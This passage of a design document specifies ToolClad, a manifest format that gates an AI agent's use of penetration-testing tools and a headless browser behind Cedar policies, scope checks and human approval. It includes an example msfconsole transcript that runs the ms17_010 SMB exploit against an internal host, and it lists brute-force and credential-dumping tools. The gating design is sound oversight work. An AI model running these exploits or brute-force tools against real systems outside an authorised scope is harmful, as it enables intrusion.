)
when {
    resource.command == "navigate" &&
    resource.url_domain in Web::DomainSet::"allowed"
};

// Block form submission on authenticated pages without human approval
forbid (
    principal,
    action == Web::Action::"browse",
    resource
)
when {
    resource.command == "submit_form" &&
    resource.page_state.is_authenticated == true
}
unless {
    resource.human_approved == true
};

// Block all JavaScript execution unless explicitly approved
forbid (
    principal,
    action == Web::Action::"browse",
    resource
)
when {
    resource.command == "execute_js"
}
unless {
    resource.human_approved == true
};

// Rate limit: max 5 form submissions per session
forbid (
    principal,
    action == Web::Action::"browse",
    resource
)
when {
    resource.command == "submit_form" &&
    resource.session_submit_count >= 5
};
```

#### Browser-Specific Scope Enforcement

URL scope checking is the browser equivalent of target scope checking on CLI tools like `nmap`. It operates at three levels:

1. **Navigation commands**: The `navigate` command's URL is validated against `[browser.scope]` before the CDP command fires.
2. **Redirect interception**: The BrowserExecutor intercepts HTTP redirects and validates each hop. A page at `allowed.example.com` that redirects to `evil.com` is blocked mid-redirect.
3. **Link click validation**: When the agent uses `click` on a link, the executor resolves the `href` and validates before allowing the navigation.

The `allow_external = false` setting is the strictest mode: the browser cannot leave the declared domain set under any circumstances. Setting `allow_external = true` allows navigation to unlisted domains but still blocks `blocked_domains`.

#### Browser Mode Applications

| Use Case | Commands Used | Governance Value |
|---|---|---|
| Web application testing | navigate, click, type_text, submit_form, extract | Scope-locked to test environment. Form submission gated. |
| Competitive intelligence | navigate, extract, screenshot | Read-only. No form submission, no JS execution. |
| Form filling / workflow automation | navigate, type_text, submit_form, extract | Human approval on submission. Scope-locked to target app. |
| Web scraping | navigate, extract, click | Read-only. Rate-limited. Domain-locked. |
| Authenticated workflows | navigate, type_text, submit_form, extract | Credential input gated. Post-auth actions require approval. |

---

### What Stateful Sessions Do Not Cover

- **TUI tools** (`htop`, `lazygit`, `vim`): Tools with full-screen terminal UIs that require cursor positioning and screen state tracking. These need a screen-scraping layer that is out of scope for ToolClad.
- **Sub-process spawning**: Tools that spawn child interactive sessions (msfconsole opening a meterpreter shell, browser spawning popups or new tabs). The current model tracks the top-level session only; nested sessions would need recursive management.
- **Unsolicited streaming**: Tools that push data without being prompted (log tailing, event streams, WebSocket push). The current model assumes a request-response pattern with ready detection (prompt match or page load).
- **Non-headless browsers**: Browser mode targets headless execution via CDP/Playwright. GUI browser automation with visual interaction (mouse coordinates, visual element recognition) is a different problem.

These are candidates for future extensions, not v1 scope.

---

## Symbiont Integration

### Runtime Discovery

On startup, the Symbiont runtime scans the `tools/` directory for `.clad.toml` files, the same way it scans `agents/` for `.dsl` files and `policies/` for `.cedar` files:

```
project/
  agents/
    recon.dsl
    enum.dsl
  policies/
    tool-authorization.cedar
    scope.cedar
  tools/
    nmap_scan.clad.toml
    whois_lookup.clad.toml
    nuclei_scan.clad.toml
    hydra_bruteforce.clad.toml
  toolclad.toml             # Optional: project-level config, custom types
  symbiont.toml
```

The runtime:

1. Parses each `.clad.toml` file
2. Validates the manifest (required fields, type definitions, template references, output schema)
3. Registers each tool as an MCP tool with `inputSchema` derived from `[args]` and `outputSchema` derived from `[output.schema]`
4. Wires the tool to the ToolClad executor in the `ActionExecutor` pipeline

### DSL Tool Reference Resolution

DSL agents reference tools by name:

```dsl
capabilities = [
    "tool.nmap_scan",
    "tool.whois_lookup",
]
```

The runtime resolves `tool.nmap_scan` by looking up `nmap_scan` in the tool registry. Resolution order:

1. **ToolClad manifests** (`tools/nmap_scan.clad.toml`)
2. **Rust-registered tools** (legacy `register_tools()` in `src/*.rs`)
3. **MCP server tools** (from connected MCP servers in `symbiont.toml`)

ToolClad manifests take priority. This allows gradual migration: existing Rust tool definitions continue to work, and teams can convert them to manifests one at a time.

### MCP Schema Generation

The `[args]` section maps to MCP `inputSchema` and `[output.schema]` maps to MCP `outputSchema`:

```toml
# From nmap_scan.clad.toml
[args.target]
position = 1
required = true
type = "scope_target"
description = "Target CIDR, IP, or hostname"

[args.scan_type]
position = 2
required = true
type = "enum"
allowed = ["ping", "service", "version", "syn"]
description = "Type of scan to perform"

[output.schema.properties.hosts]
type = "array"
description = "Discovered hosts with open ports and services"
```

Generates:

```json
{
  "name": "nmap_scan",
  "description": "Network port scanning and service detection",
  "inputSchema": {
    "type": "object",
    "properties": {
      "target": {
        "type": "string",
        "description": "Target CIDR, IP, or hostname"
      },
      "scan_type": {
        "type": "string",
        "enum": ["ping", "service", "version", "syn"],
        "description": "Type of scan to perform"
      },
      "extra_flags": {
        "type": "string",
        "description": "Additional nmap flags (must pass Gate approval)",
        "default": ""
      }
    },
    "required": ["target", "scan_type"]
  },
  "outputSchema": {
    "type": "object",
    "properties": {
      "status": { "type": "string", "enum": ["success", "error"] },
      "scan_id": { "type": "string" },
      "tool": { "type": "string" },
      "command": { "type": "string" },
      "duration_ms": { "type": "integer" },
      "timestamp": { "type": "string", "format": "date-time" },
      "output_file": { "type": "string" },
      "output_hash": { "type": "string" },
      "results": {
        "type": "object",
        "properties": {
          "hosts": {
            "type": "array",
            "description": "Discovered hosts with open ports and services"
          }
        }
      }
    }
  }
}
```

The LLM sees both schemas in the Reason phase: `inputSchema` to know what parameters to provide, `outputSchema` to know what data it will receive back. It can reason about whether a tool's output structure is useful for its current goal *before* proposing the call. It never sees or constructs the actual nmap command.

### Cedar Policy Integration

The `[tool.cedar]` section declares the Cedar resource and action for the tool:

```toml
[tool.cedar]
resource = "PenTest::ScanTarget"
action = "execute_tool"
```

The ORGA Gate builds the Cedar authorization request from the manifest metadata plus the agent's runtime context (phase, environment, agent identity). Existing Cedar policies in `policies/tool-authorization.cedar` work unchanged because they already match on `resource.tool_name`.

**Future: automatic policy generation.** Because the manifest declares the tool's risk tier, parameter types, and Cedar resource, the runtime could generate baseline Cedar policies:

```
# Auto-generated from nmap_scan.clad.toml (risk_tier = "low")
permit (
    principal,
    action == PenTest::Action::"execute_tool",
    resource
)
when {
    resource.tool_name == "nmap_scan"
};
```

Teams then refine the generated policies (add phase restrictions, environment constraints, human approval gates).

### ORGA Loop Integration

The ToolClad executor plugs into the existing ORGA action execution pipeline:

```
Observe: Agent receives input/observations
    |
Reason:  LLM proposes tool calls using MCP schemas (generated from manifests)
    |
Gate:    Cedar evaluates policy using manifest-declared resource/action
    |     + ToolClad validates all arguments against manifest type system
    |
Act:     ToolClad executor constructs command from template, executes,
         parses output, wraps in evidence envelope
    |
Observe: Agent receives structured JSON results
```

The Gate phase now has two validation layers:

1. **Cedar policy evaluation**: Is this agent, in this phase, allowed to invoke this tool on this target? (Authorization)
2. **ToolClad argument validation**: Do all parameters satisfy their declared types, ranges, patterns, and scope constraints? (Input correctness)

Both execute outside LLM influence. Both must pass for execution to proceed.

### ActionExecutor Pipeline

The `EnforcedActionExecutor` gains a ToolClad dispatch path:

```
ProposedAction
  -> ToolInvocationEnforcer (SchemaPin verification check)
  -> Cedar policy evaluation
  -> ToolClad argument validation (if manifest exists)
  -> ToolClad command construction + execution (if manifest exists)
     OR Rust tool function (if legacy registration)
     OR MCP server forwarding (if external MCP tool)
  -> Evidence envelope wrapping
  -> Observation returned to loop
```

### Scope Enforcement

Any parameter with type `scope_target`, `url` (with `scope_check = true`), `cidr`, or `ip_address` is automatically validated against the project's scope definition (`scope/scope.toml`). This replaces the `source /app/scripts/scope-check.sh; validate_scope` pattern in every wrapper script.

The scope check runs in the executor, after Cedar authorization but before command execution. This is the defense-in-depth layer: even if a Cedar policy bug allows an out-of-scope target, the ToolClad type system catches it.

---

## Migration Path from symbi-redteam

The existing symbi-redteam architecture maps cleanly to ToolClad:

| Current (7 steps) | ToolClad (2-3 steps) |
|---|---|
| 1. Write `scripts/tool-wrappers/nmap-wrapper.sh` | 1. Write `tools/nmap_scan.clad.toml` |
| 2. Define `NmapScanInput`/`NmapScanOutput` in `src/recon_tools.rs` | (auto-generated from manifest) |
| 3. Implement `nmap_scan()` function | (ToolClad executor handles this) |
| 4. Register in `register_tools()` with Cedar mappings | (auto-registered from `[tool.cedar]`) |
| 5. Add capability to agent DSL | 2. Add capability to agent DSL (unchanged) |
| 6. Add Cedar policies | 3. Add Cedar policies (unchanged, or auto-generate baseline) |
| 7. Write `scripts/parse-outputs/parse-nmap-xml.py` | (optional, use `builtin:xml` or keep custom parser) |

**Backward compatibility**: Existing Rust-registered tools and wrapper scripts continue to work. The `command.executor` escape hatch lets manifests delegate to existing wrappers during migration. Teams can convert one tool at a time.

### symbi-redteam Conversion Coverage

Of the 19 existing wrapper scripts:

- **~14 are pure template tools**: nmap, whois, dns, whatweb, amass, nikto, gobuster, enum4linux, smbclient, snmpwalk, nuclei, searchsploit, chisel, ligolo. These convert to manifests with no custom executor.
- **~3 need conditional logic**: hydra (credential file vs single credential), sqlmap (detect vs exploit mode), pypykatz (different dump types). These use `[command.conditionals]`.
- **~2 need escape hatches**: metasploit (session detection, module validation, msfconsole -x construction), impacket (multiple sub-tools). These use `command.executor` pointing to simplified wrappers that only handle command construction (validation, timeout, evidence are handled by ToolClad).

---

## Open Protocol Scope

### What is the open spec (MIT)

- The `.clad.toml` manifest format (oneshot, session, and browser modes)
- The type system and validation semantics
- The command template syntax (oneshot)
- The session command declaration format (`[session.commands]`)
- The browser command declaration format (`[browser.commands]`)
- The browser scope declaration format (`[browser.scope]`)
- The output envelope schema (oneshot and per-interaction)
- The output schema declaration (`[output.schema]`)
- The evidence metadata format
- A reference validator (checks manifest correctness)

### What is the Symbiont implementation (Apache 2.0)

- The universal executor (Rust, integrated with tokio async runtime)
- The SessionExecutor (PTY management, prompt detection, state inference)
- The BrowserExecutor (CDP/Playwright management, page state inference, redirect interception)
- Cedar policy integration and automatic policy generation
- ORGA Gate integration (two-layer validation for oneshot, per-interaction gating for sessions and browser)
- Session/page state as Cedar policy context
- URL scope enforcement with redirect interception (browser mode)
- Target scope enforcement against `scope.toml` (oneshot and session modes)
- Evidence chain with SHA-256 hashing, screenshot capture, and cryptographic audit trail
- MCP schema auto-generation from manifests (inputSchema + outputSchema)
- DSL tool reference resolution
- Runtime auto-discovery and hot-reload of manifests (dev mode only)

### Ecosystem Value

Tool vendors and security teams publish `.clad.toml` manifests alongside their CLI tools. Agent frameworks consume them. Any runtime that supports the ToolClad format can safely invoke the tool. Symbiont's implementation is the most complete, with Cedar gating, ORGA enforcement, and cryptographic audit, but a minimal executor that just does argument validation and template interpolation is useful on its own.

A tool distribution includes:

- The binary or installation instructions
- A `.clad.toml` manifest (behavioral contract)
- A SchemaPin signature in `.well-known/schemapin.json` (cryptographic identity over the manifest)

The vendor signs the manifest once with `schemapin-sign`. Consumers verify it with SchemaPin's existing TOFU pinning. No per-manifest configuration on either side. The manifest defines what the tool is and how to invoke it safely; SchemaPin proves it has not been tampered with.

---

## CLI Support

### `symbi tools list`

Lists all discovered tools with their source:

```
TOOL                SOURCE              RISK     CEDAR RESOURCE
nmap_scan           tools/nmap_scan     low      PenTest::ScanTarget
hydra_bruteforce    tools/hydra         high     PenTest::ScanTarget
custom_scanner      src/custom.rs       -        Custom::Scanner
mcp_tool            mcp://server/tool   -        (external)
```

### `symbi tools validate`

Validates all `.clad.toml` files in `tools/`:

```
tools/nmap_scan.clad.toml         OK
tools/hydra_bruteforce.clad.toml  OK
tools/broken_tool.clad.toml       ERROR: unknown type "target_ip" (did you mean "ip_address"?)
```

### `symbi tools test <name>`

Dry-run a tool invocation: validates arguments and shows the constructed command without executing:

```
$ symbi tools test nmap_scan --target 10.0.1.0/24 --scan_type service

  Manifest:  tools/nmap_scan.clad.toml
  Arguments: target=10.0.1.0/24 (scope_target: OK) scan_type=service (enum: OK)
  Command:   nmap -sT -sV --version-intensity 5 --max-rate 1000 -oX /evidence/...-nmap/scan.xml --no-stylesheet -v  10.0.1.0/24
  Cedar:     PenTest::ScanTarget / execute_tool
  Timeout:   600s

  [dry run -- command not executed]
```

### `symbi tools init <name>`

Scaffolds a new `.clad.toml` from a template:

```
$ symbi tools init my_scanner
Created tools/my_scanner.clad.toml -- edit to define your tool interface.
```

### `symbi tools schema <name>`

Outputs the auto-generated MCP JSON Schema for a tool:

```
$ symbi tools schema nmap_scan
{
  "name": "nmap_scan",
  "description": "Network port scanning and service detection",
  "inputSchema": { ... },
  "outputSchema": { ... }
}
```

### `symbi tools sessions`

Lists active session-mode tool sessions:

```
$ symbi tools sessions
SESSION                              TOOL                  AGENT         STATE           INTERACTIONS  UPTIME
a1b2c3d4-5678-...                    msfconsole_session    exploit       module_loaded   7             4m 23s
e5f6a7b8-9012-...                    psql_session          data_agent    ready           12            1m 05s
```

### `symbi tools session <id> transcript`

Dumps the full session transcript with timestamps and policy decisions:

```
$ symbi tools session a1b2c3d4 transcript
[00:00.0] STARTUP  msfconsole -q -x 'color false'
[00:03.2] READY    prompt="msf6 >" state=ready
[00:03.5] INPUT    "use exploit/windows/smb/ms17_010"  cedar=ALLOW  pattern=use_module
[00:04.1] OUTPUT   prompt="msf6 exploit(ms17_010) >" state=module_loaded
[00:04.3] INPUT    "set RHOSTS 10.0.1.5"  cedar=ALLOW  scope=OK  pattern=set_target
[00:04.8] OUTPUT   prompt="msf6 exploit(ms17_010) >" state=configured
[00:05.0] INPUT    "run"  cedar=PENDING_APPROVAL  pattern=run
[00:47.2] APPROVAL human=jascha  cedar=ALLOW
[00:47.3] INPUT    "run"  cedar=ALLOW  pattern=run
...
```

---

## SchemaPin Integration

SchemaPin signs `.clad.toml` files directly as first-class artifacts. No per-manifest configuration is needed.

A ToolClad manifest *is* a tool schema. It is the most complete tool schema that exists, because it defines not just the input/output interface but the behavioral contract: validation rules, command templates, scope constraints, session commands, output parsers. SchemaPin's existing infrastructure handles it with zero changes to the manifest format.

**Signing (tool vendor):**

```bash
schemapin-sign tools/nmap_scan.clad.toml
```

The signature and hash are published in the vendor's existing `.well-known/schemapin.json` discovery document alongside the tool name. No `[tool.schemapin]` section in the manifest. The manifest stays clean.

**Verification (runtime):**

1. Runtime loads `nmap_scan.clad.toml` from `tools/`
2. Runtime hashes the manifest content (SHA-256)
3. Runtime looks up the tool's provider domain (from `toolclad.toml` or `symbiont.toml`)
4. Runtime fetches `.well-known/schemapin.json` from the provider domain
5. Runtime verifies the hash against the published signature using SchemaPin's existing TOFU pinning
6. If verification fails, the manifest is rejected and the tool is not registered

**What this protects:** The signature covers the *entire behavioral contract*. If someone tampers with a command template, a validation rule, a scope constraint, an output schema, or a session command pattern, the hash changes and verification fails. This is strictly stronger than signing only the MCP JSON Schema, because the JSON Schema does not capture execution behavior.

**The trust chain:**

```
SchemaPin verifies the manifest has not been modified
  -> The manifest constrains what the tool can accept
    -> Cedar authorizes whether this invocation is allowed
      -> The executor constructs and runs the command
        -> Each layer trusts the one before it
```

---

## Design Decisions (Resolved)

### Output schema declaration is mandatory

If the manifest generates the MCP `inputSchema`, it must also generate the `outputSchema`. The LLM needs to know what shape of data it will get back to reason effectively *before* execution. This is not optional metadata. It is part of the behavioral contract.

The `[output.schema]` section declares the expected structure of parsed results. The executor validates parser output against this schema and rejects malformed results before they reach the agent. See the Output Handling section for the full specification.

### Hot reload is restricted to development environments

In production, tool contracts changing out from under an active agent loop introduces unpredictable state and security risks. An agent mid-ORGA-loop that suddenly gets a different parameter schema or output format has no way to recover gracefully.

- **Development mode** (`symbiont.toml: mode = "development"`): The runtime watches `tools/` for changes and reloads manifests. Useful for iterating on tool definitions.
- **Production mode**: Manifests are loaded at startup and frozen. Changes require a restart. This is the same contract as Cedar policies, which are also frozen at startup in production.

### Remote manifests are local-only in v1

Fetching `.clad.toml` files from URLs introduces a massive supply chain vulnerability. A compromised manifest server could silently alter parameter validation rules, widen scope constraints, or change command templates. SchemaPin signing mitigates this in theory, but the attack surface is too large for v1.

- **v1**: Local files only. Manifests live in `tools/` and are checked into version control.
- **Future (v2+)**: Remote fetching with mandatory SchemaPin signature verification. The runtime rejects any remote manifest that fails signature check. Discovery could use `.well-known/toolclad/` convention, mirroring SchemaPin's `.well-known/schemapin/`.

### Manifest versioning tracks CLI tool version

The `[tool].version` field tracks the underlying CLI tool version, not the manifest format version. When the manifest changes fundamentally (parameter removed, enum value dropped, output schema restructured), in-flight calls against the old schema are rejected to avoid corrupted state. The runtime compares the loaded manifest version against the version at the time the agent's ORGA loop started. If they diverge (possible only in dev mode with hot reload), the call fails with a clear error directing the agent to re-plan.

Non-breaking changes (new optional parameter with a default, new enum value added) do not trigger rejection.

## Design Principle: Keep Conditionals Simple

The `[command.conditionals]` syntax handles the common case of "include this flag when this parameter is set." It is deliberately not Turing-complete. Tools with deeply nested, mutually exclusive flag dependencies (nmap's full flag matrix, impacket's sub-tool dispatch, metasploit's module/payload/option combinations) will outgrow what TOML conditionals can express cleanly.

**The escape hatch is the intended solution for complex tools.** When you find yourself building elaborate conditional chains in TOML, that is the signal to use `command.executor` and write a focused wrapper script. The wrapper only handles command construction; ToolClad still provides parameter validation, scope enforcement, timeout, evidence capture, and the output envelope.

The 80/20 split from symbi-redteam confirms this: ~14 of 19 tools are pure template tools, ~3 use simple conditionals, and ~2 need escape hatches. If a project has more than 20-30% of tools using escape hatches, the tools themselves are probably complex enough to justify custom wrappers, and ToolClad's value shifts from "eliminate wrappers" to "standardize the contract around them."

## Remaining Open Questions

1. **HTTP API backends**: The current design targets CLI tools (oneshot), interactive CLI tools (session), and browsers (browser). HTTP API tools could use similar manifests with an `[http]` execution section: endpoint URL, method, headers, request body template, response schema. This would let ToolClad govern REST/GraphQL API calls with the same typed, policy-gated pattern.

2. **MCP server passthrough**: Tools already exposed as MCP servers could use a `[mcp]` execution section that acts as a governed proxy: validate parameters against the manifest's stricter type system, apply Cedar policy, then forward to the MCP server. This would add ToolClad governance to existing MCP tools without rewriting them.

3. **TUI tools**: Full-screen terminal applications (`htop`, `lazygit`, `vim`) require cursor positioning and screen state tracking. A screen-scraping adapter could expose TUI state as structured data, but the complexity may exceed what a manifest format should express.

4. **Nested sessions**: Tools that spawn child interactive sessions (msfconsole opening a meterpreter shell, browser popups, `kubectl exec` opening a remote shell that itself runs `psql`) would need recursive session management. The v1 model tracks the top-level session only.

5. **Unsolicited output**: Session and browser modes assume a request-response pattern with ready detection. Tools that push data without being prompted (log tailing, event streams, WebSocket push) would need an event-driven output model with its own schema and policy hooks.

6. **Browser authentication flows**: Credential entry and OAuth flows require typing sensitive data into form fields. ToolClad should integrate with secrets management (Vault/OpenBao) so that credentials are injected by the executor, never visible to the LLM. The agent proposes "log in to app X" and the executor handles credential retrieval and entry.

---

## Changelog

### v0.4.0 (2026-03-20)

- Added Browser Mode as third execution backend (BrowserExecutor, CDP/Playwright, URL scope enforcement with redirect interception, page state inference, screenshot evidence)
- Refactored "Session Mode" section into "Stateful Sessions: CLI and Browser" with shared governance layer and transport-specific backends
- Added browser manifest example with `[browser]`, `[browser.scope]`, `[browser.commands]`, and `[browser.state]` sections
- Added browser-specific Cedar policy examples (domain scope, form submission gating, JS execution gating, rate limiting)
- Added browser scope enforcement details (navigation, redirect interception, link click validation)
- Added browser applications table (web testing, competitive intelligence, form filling, scraping, authenticated workflows)
- Simplified SchemaPin integration: removed `[tool.schemapin]` manifest section entirely. SchemaPin signs `.clad.toml` files directly as first-class artifacts using existing `.well-known/schemapin.json` discovery. Zero per-manifest configuration needed.
- Updated security model with browser agent governance comparison
- Updated open protocol scope to include BrowserExecutor and browser-specific components
- Added remaining open questions for HTTP API backends, MCP passthrough, and browser authentication flows

### v0.3.0 (2026-03-20)

- Added Session Mode for interactive CLI tools (per-interaction ORGA gating, session commands as typed MCP tools, prompt-based state inference, SessionExecutor architecture)
- Made output schema (`[output.schema]`) mandatory; generates MCP `outputSchema` alongside `inputSchema`
- Resolved hot reload (dev-only), remote manifests (local-only v1), manifest versioning (tracks CLI tool version), and output schema from open questions
- Added design principle on conditional complexity with escape hatch guidance
- Expanded remaining open questions to cover TUI tools, nested sessions, and unsolicited output

### v0.2.0 (2026-03-20)

- Initial design document with oneshot execution model, type system, command construction, output handling, Symbiont integration, migration path, open protocol scope, CLI support, and SchemaPin integration